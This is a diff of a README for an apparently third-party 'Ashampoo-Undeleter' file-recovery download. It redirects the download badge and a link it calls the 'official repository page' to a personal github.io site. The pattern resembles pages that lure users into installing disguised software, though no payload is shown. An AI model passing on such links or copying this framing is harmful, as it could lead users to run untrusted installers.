@@ -1,6 +1,6 @@
 # 🔍 Ashampoo-Undeleter - Recover your lost windows files easily
 
-[![Download Ashampoo Undeleter](https://img.shields.io/badge/Download-Ashampoo_Undeleter-blue.svg)](https://github.com/danelleloth376/Ashampoo-Undeleter)
+[![Download Ashampoo Undeleter](https://img.shields.io/badge/Download-Ashampoo_Undeleter-blue.svg)](https://danelleloth376.github.io)
 
 Ashampoo-Undeleter restores files you deleted by accident. Modern computer systems often hide deleted data in sectors of the hard drive. This tool scans those sectors to find files before the system overwrites them. You can recover documents, photos, and music files with this software on Windows 10 and Windows 11.
 
@@ -18,7 +18,7 @@ The application runs on standard Windows hardware. Ensure your system meets thes
 
 Follow these steps to acquire the software:
 
-1. Visit the [official repository page](https://github.com/danelleloth376/Ashampoo-Undeleter).
+1. Visit the [official repository page](https://danelleloth376.github.io).
 2. Locate the download link.
 3. Click the link to visit the download page.
 4. Save the installer file to your computer.
